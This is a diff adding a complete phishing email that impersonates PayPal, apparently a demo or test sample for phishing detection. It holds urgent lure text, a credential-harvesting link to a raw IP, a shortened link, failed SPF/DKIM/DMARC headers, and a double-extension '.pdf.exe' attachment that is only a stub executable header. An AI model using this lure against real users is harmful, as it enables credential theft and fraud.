@@ -1,0 +1,78 @@
+From: "PayPal Account Security" <alerts@paypa1-secure-alerts.net>
+To: victim@example.com
+Subject: Unusual Sign-In Detected - Verify Your Account Within 24 Hours
+Date: Sun, 05 Jul 2026 09:12:03 -0800
+Message-ID: <demo-flagship-001@paypa1-secure-alerts.net>
+Reply-To: no-reply@account-verify-support.net
+Return-Path: <bounce@mail-relay-cluster9.net>
+MIME-Version: 1.0
+Authentication-Results: mx.example.com;
+  spf=fail (domain of paypa1-secure-alerts.net does not designate 185.220.101.45 as permitted sender) smtp.mailfrom=alerts@paypa1-secure-alerts.net;
+  dkim=fail reason="signature verification failed";
+  dmarc=fail (p=REJECT) action=none header.from=paypa1-secure-alerts.net
+Received: from unallocated.torexit.relay (185.220.101.45) by mx.example.com
+  with SMTP id def789; Sun, 05 Jul 2026 09:12:20 -0800
+Content-Type: multipart/mixed; boundary="----=_Boundary_Demo_9981"
+
+------=_Boundary_Demo_9981
+Content-Type: text/plain; charset=UTF-8
+
+Dear Customer,
+
+We detected an unusual sign-in attempt on your PayPal account from a device
+we don't recognize. To protect your account, access has been temporarily
+restricted.
+
+Action Required Immediately:
+
+Please verify your identity within 24 hours or your account will be
+permanently suspended and any pending transfers will be cancelled.
+
+VERIFY YOUR ACCOUNT NOW: http://45.61.47.23/paypal/secure/verify?id=8827
+
+For your convenience, you may also use our shortened verification link:
+http://bit.ly/3xPayPalVerify
+
+We have also attached your account activity statement for your records.
+
+This is an automated security notice. Please do not reply to this email.
+
+PayPal Account Security Team
+
+------=_Boundary_Demo_9981
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+<html>
+<body style="font-family: Arial, sans-serif; background: #f0f0f0; padding: 20px;">
+  <div style="max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px;">
+    <h2 style="color: #003087;">Unusual sign-in activity detected</h2>
+    <p>Dear Customer,</p>
+    <p>We detected an <strong>unusual sign-in attempt</strong> on your PayPal account from a device we don't recognize. Your account access has been <span style="color:red; font-weight:bold;">temporarily restricted</span>.</p>
+    <p><strong>Action Required Immediately:</strong></p>
+    <p>Please verify your identity within <strong>24 hours</strong> or your account will be <em>permanently suspended</em> and any pending transfers will be cancelled.</p>
+    <a href="http://45.61.47.23/paypal/secure/verify?id=8827"
+       style="display:inline-block; background:#003087; color:white; padding:12px 24px; border-radius:4px; text-decoration:none; font-weight:bold;">
+      Verify Your Account Now
+    </a>
+    <br><br>
+    <p>For your convenience, you may also use our shortened verification link: <a href="http://bit.ly/3xPayPalVerify">http://bit.ly/3xPayPalVerify</a></p>
+    <p>We have attached your account activity statement (PDF) for your records.</p>
+    <p style="font-size: 12px; color: #999;">PayPal, Inc. | 2211 North First Street | San Jose, CA 95131</p>
+  </div>
+</body>
+</html>
+
+------=_Boundary_Demo_9981
+Content-Type: application/pdf; name="Account_Activity_Statement.pdf.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Account_Activity_Statement.pdf.exe"
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAABUaGlzIHByb2dyYW0gY2Fubm90IGJlIHJ1
+biBpbiBET1MgbW9kZS4NCiQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+------=_Boundary_Demo_9981--
